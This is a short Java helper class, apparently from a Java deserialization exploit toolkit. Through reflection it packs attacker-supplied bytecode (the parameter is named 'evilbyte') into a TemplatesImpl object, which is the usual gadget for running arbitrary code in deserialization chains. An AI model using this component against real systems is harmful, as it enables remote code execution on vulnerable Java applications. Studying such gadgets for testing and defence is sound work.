package org.Tools;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import static org.Tools.setFieldValue.setFieldValue;

public class setTemplatesImpl {
    public static TemplatesImpl template(byte[] evilbyte) throws Exception{
        byte[][] targetByteCodes = new byte[][]{evilbyte};
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }
}
